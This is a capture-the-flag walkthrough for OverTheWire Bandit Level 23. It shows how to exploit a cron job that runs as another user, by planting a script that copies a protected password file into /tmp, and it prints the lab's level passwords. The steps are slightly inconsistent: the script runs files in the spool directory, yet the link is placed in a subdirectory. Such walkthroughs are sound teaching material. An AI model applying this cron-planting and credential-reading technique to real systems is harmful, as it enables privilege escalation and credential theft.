
# OverTheWire Bandit CTF – Level 23

## 🏆 **Goal**  
The goal of Bandit Level 23 is to exploit a cron job that executes user scripts from a specific directory. You need to create a shell script that extracts the password for the next level and stores it in a file.

---

## 🚀 **Steps to Solve**

### 1. **Connect via SSH**  
Use the password obtained from Level 22 to log into **bandit23** using SSH:

```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```

- **Username:** bandit23  
- **Hostname:** bandit.labs.overthewire.org  
- **Port:** 2220  

When prompted, enter the password from Level 22:

```
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
```

---

### 2. **Check the Cron Job Configuration**  
Navigate to the cron job configuration directory:

```bash
cd /etc/cron.d
```

List the files:

```bash
ls
```

Example output:
```
cronjob_bandit24
```

Read the contents of the cron job file:

```bash
cat cronjob_bandit24
```

Example output:
```bash
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

---

### 3. **Check the Cron Script**  
Read the script to understand what it does:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

Example output:
```bash
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname
for file in *; do
  [ -x "$file" ] && ./$file
done
```

The script:  
✅ Runs as user `bandit24`  
✅ Executes any executable file found in `/var/spool/bandit24/`  

---

### 4. **Create a Shell Script to Steal the Password**  
Create a shell script that reads the password for the next level and stores it in `/tmp`:

```bash
echo '#!/bin/bash' > /tmp/mypass.sh
echo 'cat /etc/bandit_pass/bandit24 > /tmp/password24' >> /tmp/mypass.sh
```

Make the script executable:

```bash
chmod +x /tmp/mypass.sh
```

---

### 5. **Place the Script in the Cron Directory**  
Create a symbolic link to the script in the cron-executed directory:

```bash
ln -s /tmp/mypass.sh /var/spool/bandit24/foo/mypass
```

---

### 6. **Retrieve the Password**  
After a minute (since the cron job runs every minute), check the file where the password was saved:

```bash
cat /tmp/password24
```

Example output:
```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

---

## 📸 **Screenshot**  
![Level-23](https://github.com/user-attachments/assets/1c04aaab-3899-4576-a9a5-ca01ad6443ad)

---

## 🔑 **Password for Next Level**  
The password for **Level 24** is:

```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

---

## ✅ **Summary**  
✔️ Connected to the server using SSH.  
✔️ Located the cron job configuration in `/etc/cron.d/`.  
✔️ Created a shell script to extract the password.  
✔️ Placed the script in the cron-executed directory using a symbolic link.  
✔️ Retrieved the password for Level 24!  

---

**Next Step:** Proceed to [Level 24](https://overthewire.org/wargames/bandit/bandit24.html) to continue the challenge.  

---
